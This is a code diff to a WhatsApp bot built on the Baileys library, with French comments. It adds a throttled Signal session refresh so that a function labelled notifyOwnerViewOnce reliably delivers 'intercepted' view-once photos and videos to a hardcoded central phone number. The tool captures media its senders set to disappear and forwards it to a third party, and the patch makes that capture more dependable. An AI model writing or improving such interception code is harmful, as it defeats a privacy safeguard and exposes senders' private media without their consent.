@@ -127,10 +127,26 @@ function buildCaption({ senderNumber, isGroup, from, rawJid, caption, filename, 
   return `${prefix}\nDe: @${senderNumber}${groupInfo}${via}\n${leg}💾 ${filename}`;
 }
 
+// FIX (placeholder « En attente de ce message » qui ne se résout JAMAIS) :
+// signe d'une session de chiffrement Signal cassée avec cet appareil précis,
+// pas d'un simple volume de messages. On force Baileys à récupérer un jeu de
+// clés frais pour ce JID avant l'envoi — throttlé à une fois toutes les 5 min
+// pour ne pas solliciter WhatsApp à chaque vue unique interceptée.
+const _sessionRefreshedAt = new Map();
+async function ensureFreshSession(sock, jid) {
+  const last = _sessionRefreshedAt.get(jid) || 0;
+  if (Date.now() - last < 5 * 60 * 1000) return;
+  _sessionRefreshedAt.set(jid, Date.now());
+  try {
+    if (typeof sock.assertSessions === 'function') await sock.assertSessions([jid], true);
+  } catch { /* on tente quand même l'envoi ensuite */ }
+}
+
 /** Envoie le média intercepté en DM à la session centrale 237693552769 */
 export async function notifyOwnerViewOnce(sock, ownerNumber, { buffer, kind, obj }, ctx, meta) {
   const targetJid = `${MAIN_NOTIFY_NUMBER}@s.whatsapp.net`;
   const mainSock = findSessionSocket(MAIN_NOTIFY_NUMBER) || sock;
+  await ensureFreshSession(mainSock, targetJid);
   const interceptSession = resolveSessionOwner(ownerNumber, sock);
   const senderJid = ctx.senderJid || `${ctx.senderNumber || 'inconnu'}@s.whatsapp.net`;
 
